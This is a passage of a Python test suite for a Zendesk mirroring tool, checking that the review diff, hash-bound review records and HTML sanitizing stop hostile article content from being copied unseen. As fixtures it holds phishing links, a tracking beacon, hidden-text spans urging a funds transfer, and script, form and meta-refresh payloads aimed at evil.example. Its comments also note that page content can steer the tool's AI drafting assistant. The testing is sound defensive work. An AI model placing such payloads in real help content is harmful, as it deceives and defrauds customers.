    assert res["kind"] == "article" and res["target"] == "article"
    assert res["draft_id"] == d["id"]
    # the open article's detail is re-pushed, now listing the revision
    assert len(seen["article"]) == n_details + 1
    revs = seen["article"][-1]["revisions"]
    assert [r["draft_id"] for r in revs] == [d["id"]]
    assert revs[0]["source_ref"] == "specialist-edit"
    # revisions re-push carries the origin distinction for the UI tag
    row = seen["revisions"][-1]["revisions"][0]
    assert row["source_ref"] == "specialist-edit"


def test_body_edit_article_reuses_open_specialist_draft(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    renn = zendesk_store.save_article_draft(
        conn, title="Renn rev", body="renn body", article_id=101,
        source_ref="doc:42", rationale="stale steps")
    ctrl, seen = _controller(empty_db)
    ctrl.js_open_article("101")
    ctrl.js_save_body_edit("article", "101", json.dumps({"body": "first"}))
    ctrl.js_save_body_edit("article", "101", json.dumps({"body": "second"}))
    rows = [dict(r) for r in conn.execute(
        "SELECT * FROM zendesk_article_drafts "
        "WHERE source_ref='specialist-edit'").fetchall()]
    assert len(rows) == 1                  # second edit reused the draft
    assert rows[0]["body"] == "second"
    assert rows[0]["body_html"] == _rendered("second")
    # the Renn proposal targeting the same article is never touched
    r = zendesk_store.get_article_draft(conn, renn)
    assert r["body"] == "renn body" and r["source_ref"] == "doc:42"
    # a specialist draft that moved past pending is NOT reused
    zendesk_store.set_draft_status(conn, "article", rows[0]["id"], "ready")
    ctrl.js_save_body_edit("article", "101", json.dumps({"body": "third"}))
    rows = [dict(r) for r in conn.execute(
        "SELECT * FROM zendesk_article_drafts "
        "WHERE source_ref='specialist-edit' ORDER BY id").fetchall()]
    assert [r["status"] for r in rows] == ["ready", "pending"]
    assert rows[0]["body"] == "second"     # the reviewed draft is frozen
    assert rows[1]["body"] == "third"


def test_body_edit_forged_stale_malformed_silent(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    ctrl, seen = _controller(empty_db)
    ctrl.js_refresh()                      # serves the article ids
    _serve_revisions(ctrl)
    body_ok = json.dumps({"body": "x"})
    ctrl.js_save_body_edit("bogus", "101", body_ok)     # kind allowlist
    ctrl.js_save_body_edit("article", "9999", body_ok)  # never served
    ctrl.js_save_body_edit("article", "abc", body_ok)   # malformed id
    ctrl.js_save_body_edit("draft", "999", body_ok)     # unserved draft id
    ctrl.js_save_body_edit("draft", str(did), "{not json")
    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": 5}))
    ctrl.js_save_body_edit("draft", str(did),
                           json.dumps({"body_html": "<p>x</p>"}))  # no body
    ctrl.js_save_body_edit("draft", str(did), json.dumps(["body"]))
    # served-then-deleted article (stale) → silent too
    conn.execute("DELETE FROM zendesk_articles WHERE article_id=102")
    ctrl.js_save_body_edit("article", "102", body_ok)
    assert zendesk_store.get_article_draft(conn, did)["body"] == "B"
    assert conn.execute(
        "SELECT COUNT(*) FROM zendesk_article_drafts").fetchone()[0] == 1
    assert seen["actions"] == [] and seen["status"] == []


def test_body_edit_frozen_while_pull_inflight(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    ctrl, seen = _controller(empty_db, pull_runner=lambda: True)
    _serve_revisions(ctrl)
    ctrl.js_request_pull()
    assert ctrl._pull_inflight is True
    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": "X"}))
    assert zendesk_store.get_article_draft(conn, did)["body"] == "B"
    assert seen["actions"] == []
    ctrl.notify_pull_done({"ok": True})


def test_body_edit_body_capped_at_200k(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="B", article_id=101, rationale="r")
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    ctrl.js_save_body_edit("draft", str(did),
                           json.dumps({"body": "a" * 200_001}))
    d = zendesk_store.get_article_draft(conn, did)
    assert d["body"] == "a" * 200_000
    assert seen["actions"][-1]["ok"] is True


# ── copy exact ───────────────────────────────────────────────────────

def _clipboard(calls):
    def fn(text, html):
        calls.append((text, html))
        return True
    return fn


def test_copy_article_reads_exact_db_bytes_and_announces(empty_db):
    _seed_mirror(empty_db.conn)
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()                              # serves article ids
    _review_article(ctrl, 101)                     # records the review
    ctrl.js_copy_field("article", "101", "body_html")
    raw = "<h2>Steps</h2><p>Log into the admin console.</p>"
    assert calls == [(raw, None)]
    res = seen["copies"][-1]
    assert res["ok"] is True and res["chars"] == len(raw)
    assert res["target"] == "article" and res["field"] == "body_html"
    assert res["sanitized"] is False
    # announced on the native status line (page cannot forge this surface)
    assert seen["status"] and "body_html" in seen["status"][-1]
    assert "101" in seen["status"][-1]


def test_copy_target_kind_disambiguation(empty_db):
    # an id valid in BOTH tables must copy the source the target kind names
    conn = empty_db.conn
    zendesk_store.upsert_sections(conn, [{"id": 9, "name": "FAQ"}])
    zendesk_store.upsert_articles(conn, [
        {"id": 1, "title": "Mirror article", "body_html": "<p>mirror</p>",
         "section_id": 9, "updated_at": "2026-07-01T00:00:00Z"}])
    did = zendesk_store.save_article_draft(
        conn, title="Draft one", body="draft body", article_id=1,
        rationale="r")
    assert did == 1                                # collides with article id
    zendesk_store.set_draft_status(conn, "article", did, "ready")
    calls = []
    ctrl, seen, confirms = _gated(empty_db, answer=True,
                                  clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()
    _serve_revisions(ctrl)
    _review_article(ctrl, 1)
    _review(ctrl, "article", did)
    ctrl.js_copy_field("article", "1", "title")
    ctrl.js_copy_field("article_draft", "1", "title")
    assert calls == [("Mirror article", None), ("Draft one", None)]
    # ...and only the DRAFT one took a confirm (mirror rows keep the
    # review-record gate alone)
    assert len(confirms) == 1 and "Draft one" in _confirm_blob(confirms)


def test_copy_pending_draft_refused_ready_allowed(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="**bold** body", article_id=101, rationale="r")
    calls = []
    ctrl, seen, _confirms = _gated(empty_db, answer=True,
                                   clipboard_fn=_clipboard(calls))
    _serve_revisions(ctrl)
    _review(ctrl, "article", did)
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls == [] and seen["copies"] == []    # pending → silent refusal
    zendesk_store.set_draft_status(conn, "article", did, "ready")
    # marking ready does NOT invalidate the review (content is unchanged)
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert len(calls) == 1
    assert "bold" in calls[0][0] and "**" not in calls[0][0]  # rendered md


def test_import_origin_stores_sanitized_bytes(empty_db):
    """Store-boundary sanitize (variant 3's root cause): an imported body is
    reduced to the renderable allowlist AT THE WRITE, so the bytes on the
    clipboard are the bytes the preview displays — no notice, nothing to
    hide. The old behaviour stored the raw file bytes and defanged only the
    rich mime flavour."""
    conn = empty_db.conn
    zendesk_store.upsert_articles(conn, [
        {"id": 301, "title": "Imported", "body_html": HOSTILE_HTML,
         "updated_at": "2026-07-01T00:00:00Z"}], origin="import",
        source_file="C:/tmp/x.html")
    stored = zendesk_store.get_article(conn, 301)["body_html"]
    assert "<script" not in stored.lower()
    assert "onerror" not in stored.lower()
    assert "javascript:" not in stored.lower()
    assert stored == sanitize_html(stored)         # fixed point
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()
    _review_article(ctrl, 301)
    assert seen["article"][-1]["markup_notice"] == ""
    ctrl.js_copy_field("article", "301", "body_html")
    assert calls[-1] == (stored, None)
    ctrl.js_copy_field("article", "301", "body_rich")
    assert calls[-1] == (stored, stored)
    assert seen["copies"][-1]["sanitized"] is False


def test_copy_pull_origin_body_rich_verbatim(empty_db):
    """The documented pull exception: pull bytes stay byte-faithful, and the
    rich mime flavour still passes sanitize_html (mime-laundering guard)."""
    _seed_mirror(empty_db.conn)
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()
    _review_article(ctrl, 101)
    ctrl.js_copy_field("article", "101", "body_rich")
    raw = "<h2>Steps</h2><p>Log into the admin console.</p>"
    assert calls == [(raw, raw)]
    assert seen["copies"][-1]["sanitized"] is False


def test_pull_origin_hostile_bytes_are_flagged_not_hidden(empty_db):
    """A pull-origin row keeps bytes the preview cannot display. They are
    NOT silently rewritten and NOT silently copied: the detail payload
    carries the exact source plus markup_notice, and the copy announcement
    repeats the warning on the unforgeable status line."""
    conn = empty_db.conn
    zendesk_store.upsert_articles(conn, [
        {"id": 401, "title": "Pulled", "body_html": HOSTILE_HTML,
         "updated_at": "2026-07-01T00:00:00Z"}], origin="pull")
    assert zendesk_store.get_article(conn, 401)["body_html"] == HOSTILE_HTML
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()
    _review_article(ctrl, 401)
    detail = seen["article"][-1]
    assert detail["body_source"] == HOSTILE_HTML           # exact bytes shown
    assert "<script" not in detail["body_srcdoc"].lower()  # preview differs
    assert "preview does not display" in detail["markup_notice"]
    ctrl.js_copy_field("article", "401", "body_html")
    assert calls[-1] == (HOSTILE_HTML, None)
    assert seen["copies"][-1]["notice"]
    assert "preview does not display" in seen["status"][-1]


def test_copy_draft_body_rich_sanitized(empty_db):
    """C3 regression: draft rich copies pass sanitize_html exactly like the
    origin='import' article path — markdown_to_html passes raw inline HTML
    through, so draft body_html is NOT guaranteed inert markup. The plain
    body_html field copy stays byte-verbatim (it pastes as source text)."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="x", article_id=101,
        body_html=HOSTILE_HTML, rationale="r")
    zendesk_store.set_draft_status(conn, "article", did, "ready")
    calls = []
    ctrl, seen, _confirms = _gated(empty_db, answer=True,
                                   clipboard_fn=_clipboard(calls))
    _serve_revisions(ctrl)
    _review(ctrl, "article", did)
    # plain field copy: byte-verbatim, pastes as source text
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls[-1] == (HOSTILE_HTML, None)
    assert seen["copies"][-1]["sanitized"] is False
    # rich copy: the text/html mime variant is defanged before the clipboard
    ctrl.js_copy_field("article_draft", str(did), "body_rich")
    text, html = calls[-1]
    assert text == HOSTILE_HTML                    # plain stays verbatim
    assert "<script" not in html.lower() and "onerror" not in html.lower()
    assert "javascript:" not in html.lower()
    assert seen["copies"][-1]["sanitized"] is True
    assert "sanitized" in seen["status"][-1]


def test_copy_clean_draft_body_rich_unflagged(empty_db):
    """A clean Renn-rendered draft rich copy passes through unchanged and
    is not flagged as sanitized (no false 'content removed' warning)."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="x", article_id=101,
        body_html="<h2>Steps</h2><p>Fine.</p>", rationale="r")
    zendesk_store.set_draft_status(conn, "article", did, "ready")
    calls = []
    ctrl, seen, _confirms = _gated(empty_db, answer=True,
                                   clipboard_fn=_clipboard(calls))
    _serve_revisions(ctrl)
    _review(ctrl, "article", did)
    ctrl.js_copy_field("article_draft", str(did), "body_rich")
    assert calls[-1] == ("<h2>Steps</h2><p>Fine.</p>",
                         "<h2>Steps</h2><p>Fine.</p>")
    assert seen["copies"][-1]["sanitized"] is False


def test_copy_macro_reply_from_either_comment_field(empty_db):
    _seed_mirror(empty_db.conn)
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()
    _review_macro(ctrl, 201)
    _review_macro(ctrl, 202)
    ctrl.js_copy_field("macro", "201", "macro_reply")   # comment_value
    ctrl.js_copy_field("macro", "202", "macro_reply")   # comment_value_html
    assert [c[0] for c in calls] == ["Hi there", "<p>Hello rich</p>"]


def test_copy_forged_targets_and_missing_clipboard(empty_db):
    _seed_mirror(empty_db.conn)
    ctrl, seen = _controller(empty_db)                  # no clipboard_fn
    ctrl.js_refresh()
    _review_article(ctrl, 101)
    # bad target / field / unserved id → silent
    ctrl.js_copy_field("wallet", "101", "title")
    ctrl.js_copy_field("article", "101", "raw_json")
    ctrl.js_copy_field("article", "555", "title")
    assert seen["copies"] == []
    # valid request without a clipboard fn resolves ok=False, no announcement
    ctrl.js_copy_field("article", "101", "title")
    assert seen["copies"][-1]["ok"] is False
    assert seen["status"] == []


# ── the review gate: reviewed bytes == copied bytes ──────────────────
#
# A specialist reads a diff and then pastes the copied bytes into live
# Zendesk by hand, so anything the diff does not display is content the
# review cannot catch. Three layers, all locked here:
#   L1 the projection is attribute-VISIBLE (every URL the sanitizer keeps);
#   L2 draft bytes reach the clipboard only against a CURRENT recorded
#      review (fail closed — no review, no copy);
#   L3 every draft-content mutation drops the recorded review.

PHISH_MD = ("Reset your password from [our secure portal]"
            "(https://alma-support-reset.example.com/login) today.\n\n"
            "![](https://evil.example/beacon.gif?u=1)")
PHISH_HREF = "https://alma-support-reset.example.com/login"
PHISH_SRC = "https://evil.example/beacon.gif?u=1"


def _diff_text(diff):
    return "\n".join(r["text"] for r in diff["rows"])


def test_review_projection_renders_every_url_bearing_attribute():
    """L1 unit: html_to_text is attribute-BLIND (its contract — it feeds FTS
    and snippets); html_to_review_text renders the destinations."""
    html = ('<p>Read <a href="https://good.example/a">the guide</a>.</p>'
            '<p><img src="https://evil.example/beacon.gif?u=1" alt="pixel">'
            '</p><p><img src="https://cdn.example/logo.png"></p>')
    blind = zendesk_store.html_to_text(html)
    assert "https://" not in blind                  # the defect, as designed
    seen = zendesk_store.html_to_review_text(html)
    assert "the guide (https://good.example/a)" in seen
    assert "[image: pixel (https://evil.example/beacon.gif?u=1)]" in seen
    assert "[image: https://cdn.example/logo.png]" in seen
    # degenerate shapes stay lossless and never raise
    assert zendesk_store.html_to_review_text("") == ""
    assert zendesk_store.html_to_review_text(
        '<a href="https://x.example/1">unclosed') == "unclosed (https://x.example/1)"
    assert zendesk_store.html_to_review_text("<img>") == "[image]"
    assert zendesk_store.html_to_review_text("<a>bare</a>") == "bare"
    assert "drop" not in zendesk_store.html_to_review_text(
        "<script>drop()</script><p>kept</p>")


def test_every_sanitizer_allowed_url_attribute_is_covered(empty_db):
    """Anti-drift guard: the review projection must cover EVERY URL-bearing
    attribute html_sanitize preserves. If that allowlist grows a new one,
    this fails instead of silently reopening the review blind spot."""
    from src.data import html_sanitize as hs
    allowed = set(hs._GLOBAL_ATTRS)
    for attrs in hs._TAG_ATTRS.values():
        allowed |= set(attrs)
    # every attribute the sanitizer SCHEME-CHECKS is URL-bearing by
    # definition, and the projection must cover exactly those
    scheme_checked = {"href", "src"}
    assert scheme_checked <= allowed
    assert set(zendesk_store._URL_ATTRS) == scheme_checked & allowed
    # no other well-known URL-bearing attribute slipped into the allowlist
    known_url_attrs = {"srcset", "poster", "action", "formaction", "cite",
                       "background", "longdesc", "usemap", "ping", "data",
                       "codebase", "profile", "manifest", "xlink:href",
                       "dynsrc", "lowsrc"}
    assert not (allowed & known_url_attrs)
    # style is allowlisted but cannot carry a URL (url(…) is banned and the
    # value charset excludes ':' and '/'), so it needs no projection
    assert hs._clean_style("background-color: url(https://evil.example/x)") == ""
    assert hs._clean_style("color: https://evil.example/x") == ""
    # and the projection covers each allowed attribute wherever it survives:
    # href on <a>, src on <img>, plus any future tag carrying either
    assert zendesk_store.html_to_review_text(
        '<td src="https://evil.example/x">c</td>') == (
        "[td src: https://evil.example/x]c")
    assert zendesk_store.html_to_review_text(
        '<div href="https://evil.example/y">d</div>') == (
        "[div href: https://evil.example/y]d")


def test_phishing_url_smuggled_past_the_review_is_now_visible(empty_db):
    """THE EXPLOIT, end to end. Chain executed by the verifier:
    js_open_article -> js_save_body_edit (markdown carrying a phishing link
    and a beacon image) -> js_mark_ready -> js_copy_field. The copy path
    releases body_html BYTE-VERBATIM and the sanitizer deliberately keeps
    a@href / img@src, so both URLs reached the clipboard while the
    attribute-blind diff showed the anchor TEXT with no href and no row at
    all for the image. Now: the URLs are in the diff, the copy is refused
    until a diff has actually been served, and — because this is DRAFT
    content — the release additionally needs the native confirm that puts
    those same bytes in front of a human."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen, confirms = _gated(empty_db, answer=True,
                                  clipboard_fn=_clipboard(calls))
    ctrl.js_open_article("101")
    ctrl.js_save_body_edit("article", "101", json.dumps({"body": PHISH_MD}))
    did = seen["actions"][-1]["draft_id"]
    stored = zendesk_store.get_article_draft(conn, did)["body_html"]
    assert PHISH_HREF in stored and PHISH_SRC in stored   # copy bytes

    # L2: mark_ready then copy, exactly as the exploit did — REFUSED, and
    # the refusal is announced on the trusted (unforgeable) status line.
    ctrl.js_mark_ready("article", str(did))
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls == [] and seen["copies"] == []
    assert "not been reviewed" in seen["status"][-1]

    # L1: the reviewer opens the diff — both URLs are on screen now, in the
    # AUTHORITATIVE source rows (raw markup) and in the secondary readable
    # projection alike.
    ctrl.js_request_diff("article", str(did))
    diff = seen["diffs"][-1]
    text = _diff_text(diff)
    assert PHISH_HREF in text
    assert PHISH_SRC in text
    added = "\n".join(r["text"] for r in diff["rows"] if r["tag"] == "add")
    assert f'<a href="{PHISH_HREF}">our secure portal</a>' in added
    assert f'src="{PHISH_SRC}"' in added
    projected = "\n".join(r["text"] for r in diff["text_rows"]
                          if r["tag"] == "add")
    assert f"our secure portal ({PHISH_HREF})" in projected
    assert f"[image: {PHISH_SRC}]" in projected
    # the OLD projection is what hid them (regression anchor)
    assert PHISH_HREF not in zendesk_store.html_to_text(stored)
    assert PHISH_SRC not in zendesk_store.html_to_text(stored)

    # legitimate flow: reviewed AND confirmed natively, so the copy now goes
    # through verbatim — and the confirm carried the exact phishing bytes.
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls[-1] == (stored, None)
    blob = _confirm_blob(confirms)
    assert stored in blob and PHISH_HREF in blob and PHISH_SRC in blob


def test_diff_baseline_is_projected_the_same_way_as_the_draft(empty_db):
    """L1 like-for-like: the mirror baseline goes through the review
    projection too (NOT its stored attribute-blind body_text), so an
    unchanged link is an 'equal' row and a SWAPPED destination shows up as
    a real change rather than as identical text."""
    conn = empty_db.conn
    zendesk_store.upsert_sections(conn, [{"id": 9, "name": "FAQ"}])
    zendesk_store.upsert_articles(conn, [
        {"id": 401, "title": "Reset",
         "body_html": '<p>Go to <a href="https://help.alma.test/reset">the '
                      'portal</a>.</p>',
         "section_id": 9, "updated_at": "2026-07-01T00:00:00Z"}])
    did = zendesk_store.save_article_draft(
        conn, title="Reset", body="x", article_id=401, rationale="r",
        body_html='<p>Go to <a href="https://evil.example/reset">the '
                  'portal</a>.</p>')
    ctrl, seen = _controller(empty_db)
    _serve_revisions(ctrl)
    ctrl.js_request_diff("article", str(did))
    diff = seen["diffs"][-1]
    assert diff["change_count"] > 0          # identical TEXT, swapped href
    removed = "\n".join(r["text"] for r in diff["rows"] if r["tag"] == "del")
    added = "\n".join(r["text"] for r in diff["rows"] if r["tag"] == "add")
    assert "https://help.alma.test/reset" in removed
    assert "https://evil.example/reset" in added


def test_copy_refused_after_the_draft_changes_under_the_review(empty_db):
    """L2/L3: a recorded review is bound to the CONTENT it showed, by hash.
    A page-driven re-edit, a rename, and an out-of-band store write (Renn's
    MCP tools) all invalidate it; a fresh diff restores the copy.

    Every released draft copy also crosses the universal native confirm
    (approved here) — including the last one, whose bytes Renn wrote: the
    gate no longer asks who authored anything."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen, confirms = _gated(empty_db, answer=True,
                                  clipboard_fn=_clipboard(calls))
    did = zendesk_store.save_article_draft(
        conn, title="T", body="first", article_id=101,
        body_html="<p>first</p>", rationale="r")
    _serve_revisions(ctrl)
    ctrl.js_request_diff("article", str(did))

    # L3(a): a page-driven body edit of the reviewed (pending) draft
    ctrl.js_save_body_edit("draft", str(did), json.dumps({"body": "second"}))
    zendesk_store.set_draft_status(conn, "article", did, "ready")
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls == [] and "changed since" not in " ".join(seen["status"])
    assert "not been reviewed" in seen["status"][-1]

    # re-review → the copy is released, and it is the NEW bytes
    ctrl.js_request_diff("article", str(did))
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls[-1][0] == zendesk_store.get_article_draft(
        conn, did)["body_html"]

    # L3(b): a rename through the (rename-only) save slot
    ctrl.js_save_draft("article", str(did), json.dumps({"title": "T2"}))
    ctrl.js_copy_field("article_draft", str(did), "title")
    assert len(calls) == 1
    ctrl.js_request_diff("article", str(did))
    ctrl.js_copy_field("article_draft", str(did), "title")
    assert calls[-1] == ("T2", None)

    # the two releases so far each took a native confirm
    assert len(confirms) == 2

    # L2 hash check: an out-of-band write (Renn's mirror tools write the
    # same rows from the MCP subprocess) invalidates the review even though
    # this controller never saw the mutation.
    zendesk_store.update_article_draft(
        conn, did, body_html='<p>hi <a href="https://evil.example">x</a></p>')
    n = len(calls)
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert len(calls) == n
    assert "changed since you reviewed it" in seen["status"][-1]
    ctrl.js_request_diff("article", str(did))
    assert "https://evil.example" in _diff_text(seen["diffs"][-1])
    ctrl.js_copy_field("article_draft", str(did), "body_html")
    assert calls[-1][0] == '<p>hi <a href="https://evil.example">x</a></p>'
    # ...and those are RENN's bytes, which changes nothing: E2 proved the
    # page can drive Renn, so a draft copy is a draft copy.
    assert len(confirms) == 3
    assert 'href="https://evil.example"' in _confirm_blob(confirms)


def test_macro_draft_copy_requires_a_current_review(empty_db):
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen, _confirms = _gated(empty_db, answer=True,
                                   clipboard_fn=_clipboard(calls))
    did = zendesk_store.save_macro_draft(
        conn, name="M", macro_id=201, rationale="r",
        actions=[{"field": "comment_value", "value": "Hello"}])
    zendesk_store.set_draft_status(conn, "macro", did, "ready")
    _serve_revisions(ctrl)
    ctrl.js_copy_field("macro_draft", str(did), "macro_reply")
    assert calls == [] and "not been reviewed" in seen["status"][-1]
    ctrl.js_request_diff("macro", str(did))
    ctrl.js_copy_field("macro_draft", str(did), "macro_reply")
    assert calls == [("Hello", None)]
    # content change under the review → refused again
    zendesk_store.update_macro_draft(
        conn, did, actions=[{"field": "comment_value",
                             "value": "Call https://evil.example now"}])
    ctrl.js_copy_field("macro_draft", str(did), "macro_reply")
    assert len(calls) == 1
    assert "changed since you reviewed it" in seen["status"][-1]


def test_mirror_copy_now_requires_a_review_too(empty_db):
    """VARIANT 3 (mirror copy had NO gate at all). Browsing the list served
    ids and nothing else — no view of the bytes — yet every mirror field
    copied. Now the gate covers mirror rows exactly like drafts: refused
    until the detail (which carries body_source / the verbatim action
    values) has been served, then released."""
    _seed_mirror(empty_db.conn)
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()                      # ids served, bytes NEVER shown
    ctrl.js_copy_field("article", "101", "body_html")
    ctrl.js_copy_field("article", "101", "title")
    ctrl.js_copy_field("article", "101", "body_rich")
    ctrl.js_copy_field("macro", "201", "macro_reply")
    assert calls == [] and seen["copies"] == []
    assert "has not been reviewed" in seen["status"][-1]

    _review_article(ctrl, 101)
    _review_macro(ctrl, 201)
    ctrl.js_copy_field("article", "101", "body_html")
    ctrl.js_copy_field("article", "101", "title")
    ctrl.js_copy_field("article", "101", "body_rich")
    ctrl.js_copy_field("macro", "201", "macro_reply")
    assert len(calls) == 4
    assert all(c["ok"] for c in seen["copies"])


def test_mirror_review_invalidated_when_the_row_changes(empty_db):
    """A pull/import under a served detail must not keep blessing copies:
    the recompute-from-row content hash refuses, and the pull/import
    notifications drop the ledger outright."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    calls = []
    ctrl, seen = _controller(empty_db, clipboard_fn=_clipboard(calls))
    ctrl.js_refresh()
    _review_article(ctrl, 101)
    zendesk_store.upsert_articles(conn, [
        {"id": 101, "title": "Setting up SSO",
         "body_html": '<p>Go to <a href="https://evil.example">here</a>.</p>',
         "section_id": 9, "updated_at": "2026-07-02T10:00:00Z"}])
    ctrl.js_copy_field("article", "101", "body_html")
    assert calls == []
    assert "changed since you reviewed it" in seen["status"][-1]
    # re-open (re-read the new source) → released, and it IS the new bytes
    _review_article(ctrl, 101)
    ctrl.js_copy_field("article", "101", "body_html")
    assert calls[-1][0] == zendesk_store.get_article(conn, 101)["body_html"]
    # a pull/import resolution clears the ledger outright
    ctrl.notify_pull_done({"ok": True})
    assert ctrl._reviewed == {}
    _review_article(ctrl, 101)
    ctrl.notify_import_done({"ok": True})
    assert ctrl._reviewed == {}


def test_purge_and_delete_clear_recorded_reviews(empty_db):
    """L3: draft ids are SQLite rowids and get REUSED after a delete — a
    recorded review must never survive to bless a different draft."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    did = zendesk_store.save_article_draft(
        conn, title="T", body="clean", article_id=101,
        body_html="<p>clean</p>", rationale="r")
    ctrl, seen, _confirms = _gated(empty_db, answer=True)
    _serve_revisions(ctrl)
    ctrl.js_request_diff("article", str(did))
    assert ctrl._reviewed
    ctrl.js_delete_revision("article", str(did))
    assert ctrl._reviewed == {}

    did2 = zendesk_store.save_article_draft(
        conn, title="T", body="clean", article_id=101,
        body_html="<p>clean</p>", rationale="r")
    _serve_revisions(ctrl)
    ctrl.js_request_diff("article", str(did2))
    assert ctrl._reviewed
    ctrl.js_purge_mirror("all")
    assert ctrl._reviewed == {}


# ── THE CLIPBOARD INVARIANT: the six confirmed exploit variants ──────
#
# Whatever reaches the clipboard is byte-identical to something the
# reviewer was shown, and nothing can be present in the copied bytes
# without being present in the reviewed material.
#
# Two earlier fix rounds patched the readable TEXT PROJECTION and lost,
# because a projection drops things by construction. Each test below runs
# one confirmed variant end to end and asserts the structural properties
# that make it impossible now:
#   (P1) the authoritative diff SHOWS the hostile bytes verbatim;
#   (P2) change_count is non-zero whenever the bytes differ;
#   (P3) the clipboard releases only bytes a review recorded.


def _ready_draft(conn, ctrl, **kw):
    """Stage a Renn-shaped article draft, serve it, mark it ready."""
    did = zendesk_store.save_article_draft(
        conn, article_id=101, rationale="r", **kw)
    zendesk_store.set_draft_status(conn, "article", did, "ready")
    _serve_revisions(ctrl)
    return did


def _source_added(diff):
    return "\n".join(r["text"] for r in diff["rows"] if r["tag"] == "add")


def test_variant1_allowlisted_non_url_attributes_are_visible(empty_db):
    """VARIANT 1 — allowlisted NON-URL attributes hid content. sanitize_html
    keeps style on span/div/p/td/th/mark/li and the global title attribute,
    so `<span style="font-size: 0">…deleted safety warning…</span>`,
    color:white and title="…" all survived into the copied bytes while the
    text projection reported change_count 0 and an 'equal' row.

    The authoritative diff is now the SOURCE, so every one of them is a
    visible change, and the copy is bound to those exact bytes."""
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    base = zendesk_store.get_article(conn, 101)["body_html"]
    # Each payload has a text projection IDENTICAL to the baseline's — the
    # exact "change_count 0 + equal row while different bytes ship" symptom.
    hidden = [
        '<h2>Steps</h2><p><span style="font-size: 0">'
        'Log into the admin console.</span></p>',
        '<h2>Steps</h2><p><span style="color: white">'
        'Log into the admin console.</span></p>',
        '<h2>Steps</h2><p title="Wire the funds to acct 4402 first.">'
        'Log into the admin console.</p>',
    ]
    for payload in hidden:
        # the projection genuinely cannot see it (regression anchor)
        assert (zendesk_store.html_to_review_text(payload)
                == zendesk_store.html_to_review_text(base)), payload
        calls = []
        ctrl, seen, _confirms = _gated(empty_db, answer=True,
                                       clipboard_fn=_clipboard(calls))
        did = _ready_draft(conn, ctrl, title="Setting up SSO", body="x",
                           body_html=payload)
        ctrl.js_request_diff("article", str(did))
        diff = seen["diffs"][-1]
        # P2: bytes differ ⇒ the authoritative diff must say so
        assert diff["bytes_equal"] is False
        assert diff["change_count"] > 0, payload
        assert diff["warning"] is None
        # P1: the smuggled markup is literally on screen
        assert payload in _source_added(diff)
        # the secondary projection still reports nothing — proof that it
        # is served as a convenience view and NOT as the authority
        assert diff["text_change_count"] == 0
        # P3: the copy is bound to those exact bytes
        ctrl.js_copy_field("article_draft", str(did), "body_html")
        assert calls[-1] == (payload, None)


def test_variant1_zero_size_span_is_no_longer_an_equal_row(empty_db):
    """The precise old symptom, at the diff level: change_count 0 with an
    'equal' row while different bytes hit the clipboard. Pin BOTH halves —
    the projection really is blind to it, the source diff really is not."""
    from src.data.text_diff import change_count, diff_words
    base = "<p><b>Warning: verify the payee.</b></p>"
    evil = ('<p><span style="font-size: 0"><b>Warning: verify the payee.'
            "</b></span></p>")
    # the OLD authority (regression anchor): blind
    assert change_count(diff_words(
        zendesk_store.html_to_review_text(base),
        zendesk_store.html_to_review_text(evil))) == 0
    # the NEW authority: not blind
    assert change_count(diff_words(base, evil)) > 0


def test_variant2_renn_propose_stores_sanitized_html(empty_db):
    """VARIANT 2 — Renn's propose path stored UNSANITIZED body_html
    (markdown_to_html forwards raw HTML blocks), so <script src>,
    <form action>, <object data>, <meta refresh>, <style>url()</style>,
    onclick/onerror all reached the clipboard with NO diff row.

    Sanitize now runs AT THE WRITE, so the bytes never exist; whatever
    survives is in the source diff and on the clipboard identically."""
    from src.data.chat_tools import zendesk_mirror_tools as tools
    _seed_mirror(empty_db.conn)
    conn = empty_db.conn
    body_md = (
        "Follow the steps.\n\n"
        '<script src="https://evil.example/x.js"></script>\n\n'
        '<form action="https://evil.example/collect"><input name="ssn">'
        "</form>\n\n"
        '<object data="https://evil.example/o"></object>\n\n'
        '<meta http-equiv="refresh" content="0;url=https://evil.example">\n\n'
